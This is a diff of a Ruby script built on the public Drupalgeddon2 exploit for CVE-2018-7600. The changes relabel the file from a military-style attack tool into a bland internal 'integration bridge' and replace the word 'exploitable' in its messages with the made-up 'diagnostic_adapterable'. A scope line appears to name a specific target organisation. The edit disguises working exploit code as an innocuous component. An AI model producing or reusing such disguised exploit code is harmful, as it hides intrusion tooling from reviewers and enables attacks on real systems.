@@ -1,10 +1,10 @@
 #!/usr/bin/env ruby
 #
-# 🛡️ C4ISR-STRATCOM: SIGINT-V5
-# [CLASSIFIED]: CONFIDENCIAL
-# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
-# [TACTIC]: TA0001_Initial_Access
-# [TECHNIQUE]: T1190_STRATCOM_PAYLOAD_Public_Facing_App
+# 🛡️ HCG-SYSARCH: SAM-V5
+# [RESTRICTED]: USO_INTERNO
+# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
+# [MODULO]: TA0001_Initial_Access
+# [COMPONENTE]: T1190_integration_bridge_Public_Facing_App
 #
 # [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
 #
@@ -247,7 +247,7 @@ response = http_request(url, 'get', '', $session_cookie)
 if response.code == "200" and not response.body.empty?
   puts success("Result : Form valid")
 else
-  puts error("Target is NOT exploitable (HTTP Response: #{response.code})")
+  puts error("Target is NOT diagnostic_adapterable (HTTP Response: #{response.code})")
   exit
 end
 puts "- "*40
@@ -281,7 +281,7 @@ elements.each do|e|
   if (response.code == "200" or response.code == "500") and not response.body.empty?
     result = clean_result(response.body)
     if result.include? random
-      puts success("Target seems to be exploitable!")
+      puts success("Target seems to be diagnostic_adapterable!")
       break
     end
   end
